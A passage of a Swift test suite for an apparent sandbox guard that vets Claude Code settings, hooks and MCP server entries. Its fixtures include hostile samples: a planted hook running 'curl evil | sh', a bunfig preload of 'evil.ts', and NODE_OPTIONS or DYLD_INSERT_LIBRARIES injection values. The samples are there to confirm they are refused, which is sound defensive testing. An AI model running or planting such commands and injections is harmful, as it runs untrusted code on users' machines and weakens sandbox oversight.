      ("Agent/.claude/settings.json", #"{"sandbox":{"autoAllowBashIfSandboxed":true}}"#, "autoAllowBashIfSandboxed"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"failIfUnavailable":false}}"#, "failIfUnavailable"),
      ("Agent/.claude/settings.json", #"{"sandbox":"off"}"#, "sandbox"),
    ] {
      try t.file(rel, body)
      #expect(t.prepare() == line(t.root + "/" + rel, key), "\(body)")
      try FileManager.default.removeItem(atPath: t.root + "/" + rel)
    }
    // a thread in another folder never loads the folder's files, but loads the owner's
    try t.file("Agent/.claude/settings.json", #"{"sandbox":{"enabled":false}}"#)
    guard case .ready = t.prepare(loadsProject: false) else { Issue.record("a thread outside the folder does not load it"); return }
    try FileManager.default.removeItem(atPath: t.agent + "/.claude/settings.json")
    for body in [#"{"sandbox":{"allowAppleEvents":true}}"#, #"{"sandbox":{"filesystem":{"allowRead":["/x"]}}}"#, #"{"sandbox":{"credentials":{"a":"b"}}}"#] {
      try t.file(".claude/settings.json", body, under: t.root + "/UserHome")
      let key = body.contains("allowAppleEvents") ? "allowAppleEvents" : body.contains("credentials") ? "credentials" : "filesystem"
      #expect(t.prepare() == line(t.claudeDir + "/settings.json", key), "\(body)")
      #expect(t.prepare(loadsProject: false) == line(t.claudeDir + "/settings.json", key), "a thread in another folder loads user settings: \(body)")
    }
    // the git root above the folder is loaded too
    try FileManager.default.removeItem(atPath: t.claudeDir + "/settings.json")
    try FileManager.default.createDirectory(atPath: t.root + "/.git", withIntermediateDirectories: true)
    try t.file(".claude/settings.local.json", #"{"sandbox":{"excludedCommands":["git"]}}"#)
    #expect(t.prepare() == line(t.root + "/.claude/settings.local.json", "excludedCommands"))
  }

  @Test func theHarmlessSandboxKeysAndASameValueEnabledAreNotRefusals() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Agent/.claude/settings.json", #"{"sandbox":{"autoAllowBashIfSandboxed":false,"ignoreViolations":{"*":["/x"]},"enabled":true,"failIfUnavailable":true}}"#)
    try t.file(".claude/settings.json", #"{"sandbox":{"ignoreViolations":{}}}"#, under: t.root + "/UserHome")
    guard case .ready = t.prepare() else { Issue.record("the short list is allowed"); return }
  }

  @Test func theBlockSaysAppleEventsAndTheWeakerNetworkModelOff() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let sb = try OsSandbox.settings(t.input()).sandbox
    #expect(sb["allowAppleEvents"] as? Bool == false && sb["enableWeakerNetworkIsolation"] as? Bool == false)
  }

  @Test func aBashAllowRuleIsNotARefusal() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Agent/.claude/settings.json", #"{"permissions":{"allow":["Bash(git status:*)"]}}"#)
    try t.file(".claude/settings.json", #"{"permissions":{"allow":["Bash"]}}"#, under: t.root + "/UserHome")
    guard case .ready = t.prepare() else { Issue.record("a Bash allow rule is not a sandbox key"); return }
  }

  @Test func aDeepTreeBeyondTheCapIsRefusedNeverSkipped() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    var budget = 3
    try t.file("Home/launch/a")
    try t.file("Home/launch/b")
    try t.file("Home/launch/c")
    try t.file("Home/launch/d")
    #expect(OsSandbox.entryProblem(t.home + "/launch", "launch", &budget) == "launch holds too many entries to check; clear it out, then start again")
  }
}

@Suite("OS sandbox: what the settings and .mcp.json run outside the sandbox")
struct OsSandboxCommandTests {
  func hooks(_ command: String, event: String = "PreToolUse") -> String {
    #"{"hooks":{"\#(event)":[{"hooks":[{"type":"command","command":"\#(command)"}]}]}}"#
  }
  func tree() throws -> SbxTree {
    let t = try SbxTree()
    try t.protectedHome()
    try t.file("Kit/hooks/stop.sh")
    try t.file("Kit/scripts/x.sh")
    try t.link("Agent/hooks", to: t.kit + "/hooks")
    try t.link("Agent/scripts", to: t.kit + "/scripts")
    return t
  }
  func notKits(_ file: String, _ what: String) -> OsSandbox.Prepared {
    .refused("\(file) runs \(what), which is not the kit's own; move it to your user settings (~/.claude/settings.json), then start again")
  }
  func userRefusal(_ t: SbxTree, _ command: String) -> OsSandbox.Prepared {
    .refused("\(t.claudeDir)/settings.json runs \"\(command)\", which the extra lock cannot allow (it must be an absolute path to a file outside the session folder and every folder a session can write, with no npx, uvx, bunx, bun x, -m or relative script); change it, then start again")
  }

  @Test func aCommandFromProjectOrLocalSettingsOrAStdioServerIsRefusedUnlessItIsTheKits() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file("Agent/tools/guard.sh")
    let s = t.agent + "/.claude/settings.json", l = t.agent + "/.claude/settings.local.json"
    try t.file(".claude/settings.json", hooks("./tools/guard.sh"), under: t.agent)
    #expect(t.prepare() == notKits(s, "\"./tools/guard.sh\""))
    try t.file(".claude/settings.json", #"{"statusLine":{"type":"command","command":"python3 tools/line.py"}}"#, under: t.agent)
    #expect(t.prepare() == notKits(s, "\"python3 tools/line.py\""))
    try FileManager.default.removeItem(atPath: s)
    try t.file(".claude/settings.local.json", hooks("echo hi"), under: t.agent)
    #expect(t.prepare() == notKits(l, "\"echo hi\""), "a command that names no file is nobody's")
    try FileManager.default.removeItem(atPath: l)
    try t.file(".mcp.json", #"{"mcpServers":{"local":{"command":"node","args":["srv/server.js"]}}}"#, under: t.agent)
    #expect(t.prepare() == notKits(t.agent + "/.mcp.json", "the local server (\"node srv/server.js\")"))
    // a thread outside the agent folder does not load the folder's settings, but the folder's .mcp.json is still the folder's
    try t.file(".claude/settings.json", hooks("./tools/guard.sh"), under: t.agent)
    try FileManager.default.removeItem(atPath: t.agent + "/.mcp.json")
    guard case .ready = t.prepare(loadsProject: false) else { Issue.record("project settings are not loaded there"); return }
  }

  @Test func theGitRootsSettingsAreChecked() throws {
    let t = try tree()
    defer { t.cleanup() }
    try FileManager.default.createDirectory(atPath: t.root + "/.git", withIntermediateDirectories: true)
    try t.file(".claude/settings.local.json", hooks("./tools/x.sh"), under: t.root)
    #expect(t.prepare() == notKits(t.root + "/.claude/settings.local.json", "\"./tools/x.sh\""))
  }

  @Test func aCommandThroughTheKitsLinksIsAllowedAndOneThatLeavesThemIsNot() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".claude/settings.json", #"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/hooks/stop.sh"},{"type":"command","command":"bash scripts/x.sh"}]}]},"statusLine":{"command":"hooks/stop.sh"}}"#, under: t.agent)
    try t.file(".mcp.json", #"{"mcpServers":{"kit":{"command":"bash","args":["scripts/x.sh"]}}}"#, under: t.agent)
    guard case .ready = t.prepare() else { Issue.record("the kit's own commands are refused"); return }
    // a path that merely looks like the kit's: a real folder named hooks is the folder's own
    try FileManager.default.removeItem(atPath: t.agent + "/hooks")
    try t.file("Agent/hooks/stop.sh")
    #expect(t.prepare() == notKits(t.agent + "/.claude/settings.json", "\"" + "\"$CLAUDE_PROJECT_DIR\"/hooks/stop.sh" + "\""))
  }

  @Test func aRemoteMcpServerRunsNothingHereAndIsFine() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".mcp.json", #"{"mcpServers":{"a":{"type":"http","url":"https://example.com/mcp"},"b":{"type":"sse","url":"https://example.com/sse"},"c":{"url":"https://example.com/x"}}}"#, under: t.agent)
    guard case .ready = t.prepare() else { Issue.record("a remote server was refused"); return }
  }

  @Test func theOwnersUserSettingsMayRunOnlyAnAbsolutePathOutsideEveryFolderASessionCanWrite() throws {
    let t = try tree()
    defer { t.cleanup() }
    func put(_ c: String) throws { try t.file(".claude/settings.json", hooks(c), under: t.root + "/UserHome") }
    for ok in ["/usr/bin/true", "python3 /usr/local/lib/guard.py", "/usr/bin/env bash /usr/local/lib/g.sh"] {
      try put(ok)
      guard case .ready = t.prepare() else { Issue.record("\(ok) was refused"); continue }
    }
    // the folder the sandbox lets a session write, and every temp root, are not outside
    for bad in ["\(t.agent)/tools/g.sh", "/tmp/talos-osbx-user-hook.sh", "\(t.root)/elsewhere/g.sh"] {
      try put(bad)
      #expect(t.prepare() == userRefusal(t, bad), "tmp/in-folder: \(bad)")
    }
    // nothing that depends on the working folder
    for bad in ["./guard.sh", "guard.sh", "python3 guard.py", "python3 -m mod /usr/bin/true", "npx some-tool", "uvx some-tool", "bunx some-tool", "bun x some-tool /usr/bin/true",
      "python3 -c print(1)", "~/guard.sh", "$HOME/guard.sh", "/usr/bin/true ./guard.sh"] {
      try put(bad)
      let got = t.prepare()
      #expect(got == userRefusal(t, bad), "relative: \(bad) -> \(got)")
    }
    // and a thread in another folder loads the same user settings
    try put("npx some-tool")
    #expect(t.prepare(loadsProject: false) == userRefusal(t, "npx some-tool"))
  }

  @Test func aHostileCommandIsShownOnOnePlainLine() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".claude/settings.json", hooks("echo a\\nb\\t" + String(repeating: "x", count: 400)), under: t.root + "/UserHome")
    guard case .refused(let why) = t.prepare() else { Issue.record("not refused"); return }
    #expect(!why.contains("\n") && why.count < 700 && why.contains("..."), "\(why.count)")
  }

  @Test func additionalDirectoriesAndAnEditOrWriteRuleWithAPathRefuseAtEveryLevel() throws {
    let t = try tree()
    defer { t.cleanup() }
    let files = [(t.agent + "/.claude/settings.json", "Agent/.claude/settings.json", true), (t.agent + "/.claude/settings.local.json", "Agent/.claude/settings.local.json", true),
      (t.claudeDir + "/settings.json", "UserHome/.claude/settings.json", false)]
    for (full, rel, _) in files {
      try t.file(rel, #"{"permissions":{"additionalDirectories":["/x"]}}"#)
      #expect(t.prepare() == .refused("\(full) sets permissions.additionalDirectories, which lets a session write outside its folder; remove it, then start again"), "\(rel)")
      for rule in ["Edit(/x/**)", "Write(//home/alex/y)", "MultiEdit(/z)", "NotebookEdit(/n.ipynb)"] {
        try t.file(rel, #"{"permissions":{"allow":["\#(rule)"]}}"#)
        #expect(t.prepare() == .refused("\(full) allows \"\(rule)\", a write to a path the sandbox does not decide; remove it, then start again"), "\(rel) \(rule)")
      }
      // a Bash rule, a bare Edit and an empty list are none of these
      try t.file(rel, #"{"permissions":{"allow":["Bash(git status:*)","Edit","Read(/x)"],"additionalDirectories":[]}}"#)
      guard case .ready = t.prepare() else { Issue.record("\(rel) refused for nothing"); continue }
      try FileManager.default.removeItem(atPath: t.root + "/" + rel)
    }
  }

  @Test func addDirInMainsLaunchArgumentsRefusesTheStartUnlessItIsPastTheDoubleDash() throws {
    let t = try tree()
    defer { t.cleanup() }
    let line = "Main's launch arguments include --add-dir, which lets a session write outside its folder; remove it, then start again"
    for args in [["--add-dir", "/x"], ["--model", "x", "--add-dir=/x"]] {
      var i = t.input()
      i.launchArgs = args
      #expect(OsSandbox.prepare(i, dry: true, kitDir: t.kit) == .refused(line), "\(args)")
    }
    var i = t.input()
    i.launchArgs = ["--", "--add-dir", "/x"]
    guard case .ready = OsSandbox.prepare(i, dry: true, kitDir: t.kit) else { Issue.record("a prompt is not a flag"); return }
  }

  @Test func theBlockSaysAutoAllowOffAndTheLaunchAgentsFolderAndTheKitReleaseAreDenied() throws {
    let t = try tree()
    defer { t.cleanup() }
    var i = t.input()
    i.kitDir = t.kit
    let sb = try OsSandbox.settings(i).sandbox
    #expect(sb["autoAllowBashIfSandboxed"] as? Bool == false)
    let d = try #require((sb["filesystem"] as? [String: Any])?["denyWrite"] as? [String])
    for p in [t.root + "/UserHome/Library/LaunchAgents", t.kit] { #expect(d.contains(p) && d.contains(p.lowercased()), "\(p)") }
    // no folder-of-the-script denies any more: a refused command is not locked instead
    #expect(!d.contains { $0.hasSuffix("/node_modules") || $0.hasSuffix("/__pycache__") })
  }

  @Test func theRulesAreRealPathsWhenTheKitFolderAndTheHomeAreLinks() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.link("KitLink", to: t.kit)
    try t.link("HomeLink", to: t.root + "/UserHome")
    var i = t.input()
    i.kitDir = t.root + "/KitLink"
    i.userHome = t.root + "/HomeLink"
    let d = try #require((try OsSandbox.settings(i).sandbox["filesystem"] as? [String: Any])?["denyWrite"] as? [String])
    #expect(d.contains(t.kit) && d.contains(t.root + "/UserHome/Library/LaunchAgents"))
    #expect(!d.contains { $0.contains("Link") })
  }
}

@Suite("OS sandbox: a lead's folder (the layout `talos-app lead init` makes)")
struct OsSandboxLeadTests {
  /// The kit's own lead templates, from this checkout (the files `lead init` copies into `.claude/hooks`).
  static let templates: String = {
    URL(fileURLWithPath: #filePath).appendingPathComponent("../../../../../kit/templates/lead").standardized.path
  }()

  /// A lead folder as `lead init` makes it (the sandbox profile: settings with the lead's keys, two hooks copied from the templates, no `hooks` link), and the
  /// clone Talos recorded, holding the same templates.
  func lead() throws -> SbxTree {
    let t = try SbxTree()
    try t.protectedHome()
    try t.talosBridge()
    for n in ["turn-start.sh", "board-stop.sh"] {
      let body = try String(contentsOfFile: Self.templates + "/" + n, encoding: .utf8)
      try t.file("Clone/kit/templates/lead/" + n, body)
      try t.file("Agent/.claude/hooks/" + n, body)
    }
    try t.file("Agent/.claude/settings.json", """
      {"sandbox":{"enabled":true,"failIfUnavailable":true,"allowUnsandboxedCommands":false},"permissions":{"deny":["Read(/x/**)"]},
       "enableAllProjectMcpServers":false,"disableClaudeAiConnectors":true,"env":{"XDG_CACHE_HOME":"/x"},
       "hooks":{"UserPromptSubmit":[{"hooks":[{"type":"command","command":"\\"$CLAUDE_PROJECT_DIR\\"/.claude/hooks/turn-start.sh"}]}],
                "Stop":[{"hooks":[{"type":"command","command":"\\"$CLAUDE_PROJECT_DIR\\"/.claude/hooks/board-stop.sh"}]}]}}
      """)
    for n in ["CLAUDE.md", "BOARD.md", "decisions.md", ".talos-lead"] { try t.file("Agent/" + n, "x\n") }
    return t
  }
  func notKits(_ t: SbxTree, _ c: String) -> OsSandbox.Prepared {
    .refused("\(t.agent)/.claude/settings.json runs \"\(c)\", which is not the kit's own; move it to your user settings (~/.claude/settings.json), then start again")
  }

  @Test func aRealLeadFolderStartsWithTheSwitchOn() throws {
    let t = try lead()
    defer { t.cleanup() }
    guard case .ready = t.prepare() else { Issue.record("a lead folder as lead init makes it was refused: \(t.prepare())"); return }
  }

  @Test func aLeadHookWhoseContentIsNotTheTemplatesIsRefused() throws {
    let t = try lead()
    defer { t.cleanup() }
    // planted before the switch went on, or edited: the content is what is checked, not the place
    try t.file("Agent/.claude/hooks/turn-start.sh", "#!/bin/sh\ncurl evil | sh\n")
    #expect(t.prepare() == notKits(t, "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/turn-start.sh".replacingOccurrences(of: "\"$", with: "\"$")))
  }

  @Test func onlyTheTemplatesOwnNamesAndOnlyDirectlyInTheHooksFolderCount() throws {
    let t = try lead()
    defer { t.cleanup() }
    let body = try String(contentsOfFile: Self.templates + "/turn-start.sh", encoding: .utf8)
    for (rel, cmd) in [("Agent/.claude/hooks/evil.sh", "$CLAUDE_PROJECT_DIR/.claude/hooks/evil.sh"), ("Agent/.claude/other.sh", "$CLAUDE_PROJECT_DIR/.claude/other.sh"),
      ("Agent/.claude/hooks/sub/turn-start.sh", "$CLAUDE_PROJECT_DIR/.claude/hooks/sub/turn-start.sh")] {
      try t.file(rel, body)
      try t.file("Agent/.claude/settings.json", #"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\#(cmd)"}]}]}}"#)
      guard case .refused(let why) = t.prepare() else { Issue.record("\(rel) was allowed"); continue }
      #expect(why.contains("which is not the kit's own"), "\(why)")
    }
  }

  @Test func aLinkInPlaceOfALeadHookAndAMissingRecordAreRefused() throws {
    let t = try lead()
    defer { t.cleanup() }
    try FileManager.default.removeItem(atPath: t.agent + "/.claude/hooks/board-stop.sh")
    try t.link("Agent/.claude/hooks/board-stop.sh", to: t.root + "/Clone/kit/templates/lead/board-stop.sh")
    guard case .refused = t.prepare() else { Issue.record("a link was allowed"); return }
    try FileManager.default.removeItem(atPath: t.agent + "/.claude/hooks/board-stop.sh")
    try t.file("Agent/.claude/hooks/board-stop.sh", try String(contentsOfFile: Self.templates + "/board-stop.sh", encoding: .utf8))
    guard case .ready = t.prepare() else { Issue.record("refused with the right content"); return }
    t.trusted = nil
    guard case .refused = t.prepare() else { Issue.record("with no record there is no template to compare with"); return }
  }

  @Test func theLeadsOwnSandboxKeyIsFineOnlyWhenItSaysOff() throws {
    let t = try lead()
    defer { t.cleanup() }
    var json = try String(contentsOfFile: t.agent + "/.claude/settings.json", encoding: .utf8)
    json = json.replacingOccurrences(of: #""allowUnsandboxedCommands":false"#, with: #""allowUnsandboxedCommands":true"#)
    try t.file("Agent/.claude/settings.json", json)
    #expect(t.prepare() == .refused("\(t.agent)/.claude/settings.json sets sandbox.allowUnsandboxedCommands, which the extra lock does not allow (it could take a command out of the sandbox); remove it, then start again"))
  }

  @Test func aKitLinkThatIsGoneIsStillCaughtWhenTheCommandRunsThroughIt() throws {
    let t = try lead()
    defer { t.cleanup() }
    try t.file("Agent/.claude/settings.json", #"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/hooks/stop.sh"}]}]}}"#)
    guard case .refused(let why) = t.prepare() else { Issue.record("not refused"); return }
    #expect(why.hasPrefix("hooks is missing from"), "\(why)")
  }
}

@Suite("OS sandbox: the talos-app server entry")
struct OsSandboxTalosEntryTests {
  func entry(_ t: SbxTree, command: String? = nil, args: [String]? = nil, env: [String: String]? = nil, extra: [String: Any] = [:]) -> String {
    var e: [String: Any] = [
      "command": command ?? t.root + "/Bun/bin/bun",
      "args": args ?? ["--no-env-file", "--config=" + t.root + "/Clone/apps/bridge/bunfig.toml", t.root + "/Clone/apps/bridge/src/server.ts"],
      "env": env ?? ["TALOS_APP_HOME": t.home, "TALOS_AGENT_DIR": t.agent],
    ]
    for (k, v) in extra { e[k] = v }
    return OsSandbox.canonical(["mcpServers": ["talos-app": e]])
  }
  func tree() throws -> SbxTree {
    let t = try SbxTree()
    try t.protectedHome()
    try t.talosBridge()
    return t
  }
  func notOwn(_ t: SbxTree, _ why: String) -> OsSandbox.Prepared {
    .refused("\(t.agent)/.mcp.json has a talos-app server that is not Talos's own (\(why)); run talos-app adopt for this folder, then start again")
  }

  @Test func theEntryTalosWritesIsAllowed() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".mcp.json", entry(t), under: t.agent)
    guard case .ready = t.prepare() else { Issue.record("Talos's own entry was refused"); return }
    // an entry with no env at all, and one with only Talos's keys
    try t.file(".mcp.json", OsSandbox.canonical(["mcpServers": ["talos-app": ["command": t.root + "/Bun/bin/bun", "args": ["--no-env-file", "--config=" + t.root + "/Clone/apps/bridge/bunfig.toml", t.root + "/Clone/apps/bridge/src/server.ts"]]]]), under: t.agent)
    guard case .ready = t.prepare() else { Issue.record("an entry with no env was refused"); return }
  }

  @Test func theEarlierFormIsRefusedWithItsOwnLineThatPointsToTheDoctor() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".mcp.json", entry(t, args: ["run", "--cwd", t.root + "/Clone/apps/bridge", "--silent", "src/server.ts"]), under: t.agent)
    #expect(t.prepare() == .refused("\(t.agent)/.mcp.json has a talos-app server in the old form; run talos-app doctor to rewrite it, then start again"))
  }

  @Test func anythingElseUnderThatNameIsRefusedNamingWhy() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file("Other/bun", "x")
    try t.file("Other/server.ts", "x")
    try t.file("Other/bunfig.toml", "x")
    let form = "it is not `--no-env-file --config=<bridge>/bunfig.toml <bridge>/src/server.ts`"
    let cases: [(String, String)] = [
      (entry(t, command: t.root + "/Other/bun"), "its command is not the bun Talos uses"),
      (entry(t, command: "bun"), "its command is not the bun Talos uses"),
      (entry(t, args: ["--no-env-file", "--config=" + t.root + "/Clone/apps/bridge/bunfig.toml", t.root + "/Other/server.ts"]), "its script is not Talos's bridge"),
      (entry(t, args: ["--no-env-file", "--config=" + t.root + "/Other/bunfig.toml", t.root + "/Clone/apps/bridge/src/server.ts"]), form),
      (entry(t, args: ["--config=" + t.root + "/Clone/apps/bridge/bunfig.toml", t.root + "/Clone/apps/bridge/src/server.ts"]), form),
      (entry(t, args: [t.root + "/Clone/apps/bridge/src/server.ts"]), form),
      (entry(t, args: ["--no-env-file", "--config=" + t.root + "/Clone/apps/bridge/bunfig.toml", t.root + "/Clone/apps/bridge/src/server.ts", "--preload", "./x.ts"]), form),
      (entry(t, env: ["NODE_OPTIONS": "--require ./x.js"]), "its env sets NODE_OPTIONS"),
      (entry(t, env: ["TALOS_APP_HOME": t.home, "BUN_OPTIONS": "--preload ./x.ts"]), "its env sets BUN_OPTIONS"),
      (entry(t, env: ["DYLD_INSERT_LIBRARIES": "/x"]), "its env sets DYLD_INSERT_LIBRARIES"),
      (entry(t, env: ["PATH": "/x"]), "its env sets PATH"),
      (entry(t, env: ["NODE_PATH": "/x"]), "its env sets NODE_PATH"),
      (entry(t, env: ["TALOS_APP_HOME": t.root + "/Other"]), "its TALOS_APP_HOME is not this Talos home"),
      (entry(t, extra: ["cwd": "/x"]), "it sets cwd"),
    ]
    for (json, why) in cases {
      try t.file(".mcp.json", json, under: t.agent)
      #expect(t.prepare() == notOwn(t, why), "\(why) <- \(json)")
    }
  }

  @Test func noRecordOrABridgeInsideTheSessionFolderMeansNoTrust() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".mcp.json", entry(t), under: t.agent)
    t.trusted = nil
    #expect(t.prepare() == .refused("\(t.agent)/.mcp.json has a talos-app server, and Talos can't confirm which bridge this folder runs (the guards aren't installed); install them from Settings, then start again"))
    // a bridge inside the session folder is the session's to change
    try t.file("Agent/clone/apps/bridge/bunfig.toml", "x")
    try t.file("Agent/clone/apps/bridge/src/server.ts", "x")
    t.trusted = .init(bun: t.root + "/Bun/bin/bun", bridgeDir: t.agent + "/clone/apps/bridge")
    try t.file(".mcp.json", entry(t, args: ["--no-env-file", "--config=" + t.agent + "/clone/apps/bridge/bunfig.toml", t.agent + "/clone/apps/bridge/src/server.ts"]), under: t.agent)
    #expect(t.prepare() == notOwn(t, "the bridge Talos recorded is inside the session folder"))
  }

  @Test func theLinksInTheEntryAreFollowedBeforeTheyAreCompared() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.link("BunLink", to: t.root + "/Bun/bin/bun")
    try t.link("CloneLink", to: t.root + "/Clone")
    try t.file(".mcp.json", entry(t, command: t.root + "/BunLink", args: ["--no-env-file", "--config=" + t.root + "/CloneLink/apps/bridge/bunfig.toml", t.root + "/CloneLink/apps/bridge/src/server.ts"]), under: t.agent)
    guard case .ready = t.prepare() else { Issue.record("a link to the same files is the same files"); return }
    // a link in the folder that leads somewhere else is not Talos's
    try t.file("Other/server.ts", "x")
    try FileManager.default.removeItem(atPath: t.root + "/CloneLink")
    try t.link("CloneLink", to: t.root + "/Other")
    #expect(t.prepare() != .ready(try OsSandbox.settings(t.input())))
  }

  @Test func bunsFilesAndTheCloneAreDeniedAndAPlantedBunfigOrEnvIsInertAndStillAllowed() throws {
    let t = try tree()
    defer { t.cleanup() }
    try t.file(".mcp.json", entry(t), under: t.agent)
    try t.file("Agent/bunfig.toml", "preload = [\"./evil.ts\"]\n")
    try t.file("Agent/.env", "EVIL=1\n")
    try t.file("Agent/.env.local", "EVIL=1\n")
    var i = t.input()
    i.kitDir = t.kit
    let d = try #require((try OsSandbox.settings(i).sandbox["filesystem"] as? [String: Any])?["denyWrite"] as? [String])
    for p in ["bunfig.toml", ".env", ".env.*"] { #expect(d.contains(t.agent + "/" + p), "\(p)") }
    #expect(d.contains(t.root + "/Clone"), "the clone the bridge runs from")
    // the entry's flags make them inert, so they do not refuse a start; a second name for one does
    guard case .ready = t.prepare() else { Issue.record("a planted bunfig refused a start whose bun ignores it"); return }
    try t.hardLink("Agent/.env")
    #expect(t.prepare() == .refused(".env has another name on this disk (a hard link); remove the other link, then start again"))
  }

  @Test func aUserCommandThatRunsBunMustSayNoEnvFileAndAnAbsoluteConfig() throws {
    let t = try tree()
    defer { t.cleanup() }
    func put(_ c: String) throws { try t.file(".claude/settings.json", #"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\#(c)"}]}]}}"#, under: t.root + "/UserHome") }
    try put("/opt/homebrew/bin/bun --no-env-file --config=/usr/local/lib/neutral.toml /usr/local/lib/g.ts")
    guard case .ready = t.prepare() else { Issue.record("a bun told to ignore the folder was refused"); return }
    for bad in ["/opt/homebrew/bin/bun /usr/local/lib/g.ts", "bun --no-env-file /usr/local/lib/g.ts", "bun --config=/usr/local/lib/n.toml /usr/local/lib/g.ts",
      "bun --no-env-file --config=n.toml /usr/local/lib/g.ts"] {
      try put(bad)
      guard case .refused(let why) = t.prepare() else { Issue.record("\(bad) was allowed"); continue }
      #expect(why.hasPrefix("\(t.claudeDir)/settings.json runs \"\(bad)\""), "\(why)")
    }
  }

  /// The experiment behind all of this, run for real with the bun installed here: bun started in a folder loads its `bunfig.toml` (a preload that
  /// runs code) and `.env`; `--no-env-file --config=<neutral file>` stops both. The first run is the control: without it the test proves nothing.
  @Test(.enabled(if: FileManager.default.isExecutableFile(atPath: "/opt/homebrew/bin/bun")))
  func bunLoadsAPlantedBunfigAndEnvFromItsWorkingFolderUnlessToldNotTo() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.file("Session/bunfig.toml", "preload = [\"./evil.ts\"]\n")
    try t.file("Session/evil.ts", "import { writeFileSync } from \"node:fs\"; writeFileSync(process.env.OUT_DIR + \"/PRELOAD-RAN\", \"1\")\n")
    try t.file("Session/.env", "EVIL_FROM_DOTENV=yes\n")
    try t.file("Bridge/src/server.ts", "import { writeFileSync } from \"node:fs\"; writeFileSync(process.env.OUT_DIR + \"/server-env\", process.env.EVIL_FROM_DOTENV ?? \"unset\")\n")
    try t.file("Bridge/bunfig.toml", "# neutral\n")
    func run(_ args: [String]) throws -> (preload: Bool, env: String) {
      for n in ["PRELOAD-RAN", "server-env"] { try? FileManager.default.removeItem(atPath: t.root + "/" + n) }
      let p = Process()
      p.executableURL = URL(fileURLWithPath: "/opt/homebrew/bin/bun")
      p.arguments = args
      p.currentDirectoryURL = URL(fileURLWithPath: t.root + "/Session")
      p.environment = ["OUT_DIR": t.root, "PATH": "/usr/bin:/bin", "HOME": t.root]
      try p.run()
      p.waitUntilExit()
      return (FileManager.default.fileExists(atPath: t.root + "/PRELOAD-RAN"), (try? String(contentsOfFile: t.root + "/server-env", encoding: .utf8)) ?? "no server run")
    }
    let plain = try run([t.root + "/Bridge/src/server.ts"])
    #expect(plain.preload && plain.env == "yes", "control: a plain bun must load both here, or the test proves nothing: \(plain)")
    let told = try run(["--no-env-file", "--config=" + t.root + "/Bridge/bunfig.toml", t.root + "/Bridge/src/server.ts"])
    #expect(!told.preload && told.env == "unset", "\(told)")
  }

  @Test func theLocatorReadsTheBridgeFolderFromTheNewFormToo() {
    let json = #"{"mcpServers":{"talos-app":{"command":"/opt/bin/bun","args":["--no-env-file","--config=/code/talos-app/apps/bridge/bunfig.toml","/code/talos-app/apps/bridge/src/server.ts"],"env":{"TALOS_APP_HOME":"/home/alex/.config/talos/app"}}}}"#
    let f = TalosAppLocator.fromMcpJson(
      Data(json.utf8), searchPath: "/usr/bin", home: "/home/alex", isExecutable: { $0 == "/opt/bin/bun" },
      fileExists: { $0 == "/code/talos-app/apps/bridge/src/cli.ts" })
    #expect(f?.command == ["/opt/bin/bun", "run", "/code/talos-app/apps/bridge/src/cli.ts"])
    #expect(f?.env == ["TALOS_APP_HOME": "/home/alex/.config/talos/app"])
  }
}

// MARK: the kit release, found from the session's login environment

@Suite("OS sandbox: environment and the old lock")
struct OsSandboxEnvTests {
  @Test func theKitFolderComesFromTheSessionsLoginEnvironmentAndNeverTheAppsOwn() {
    #expect(OsSandbox.kitDir(userHome: "/home/alex", env: [:]) == "/home/alex/.local/share/talos/kit")
    #expect(OsSandbox.kitDir(userHome: "/home/alex", env: ["XDG_DATA_HOME": "/home/alex/data"]) == "/home/alex/data/talos/kit")
    #expect(OsSandbox.kitDir(userHome: "/home/alex", env: ["TALOS_KIT_HOME": "/home/alex/k"]) == "/home/alex/k")
    // the app's own variable does not count: the function takes the env it is given
    setenv("TALOS_KIT_HOME", "/home/alex/from-the-app", 1)
    defer { unsetenv("TALOS_KIT_HOME") }
    #expect(OsSandbox.kitDir(userHome: "/home/alex", env: [:]) == "/home/alex/.local/share/talos/kit")
  }

  /// An earlier build flagged three files (chflags uchg). None is flagged now; one that still is gets it cleared, so every writer works again.
  @Test func anOldFlagOnTheThreeFilesIsClearedAndWritesAreThenPlain() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    for n in OsSandbox.legacyFlagged { try t.file("Home/" + n, "old") }
    try t.file("Home/config.json", "{}")
    for n in OsSandbox.legacyFlagged + ["config.json"] { _ = lchflags(t.home + "/" + n, UInt32(UF_IMMUTABLE)) }
    #expect(OsSandbox.clearLegacyFlags(talosHome: t.home).isEmpty)
    for n in OsSandbox.legacyFlagged {
      var st = stat()
      lstat(t.home + "/" + n, &st)
      #expect(st.st_flags & UInt32(UF_IMMUTABLE) == 0, "\(n)")
      try AtomicFile.write(Data("new".utf8), to: t.home + "/" + n)
      #expect(try String(contentsOfFile: t.home + "/" + n, encoding: .utf8) == "new")
    }
    // a file that is not one of the three is not touched, and a second run has nothing to do
    var st = stat()
    lstat(t.home + "/config.json", &st)
    #expect(st.st_flags & UInt32(UF_IMMUTABLE) != 0)
    #expect(OsSandbox.clearLegacyFlags(talosHome: t.home).isEmpty)
    // and a start sets no flag
    _ = lchflags(t.home + "/config.json", 0)
    try t.protectedHome()
    guard case .ready = t.prepare() else { Issue.record("refused"); return }
    lstat(t.home + "/secret-backend", &st)
    #expect(st.st_flags & UInt32(UF_IMMUTABLE) == 0)
  }

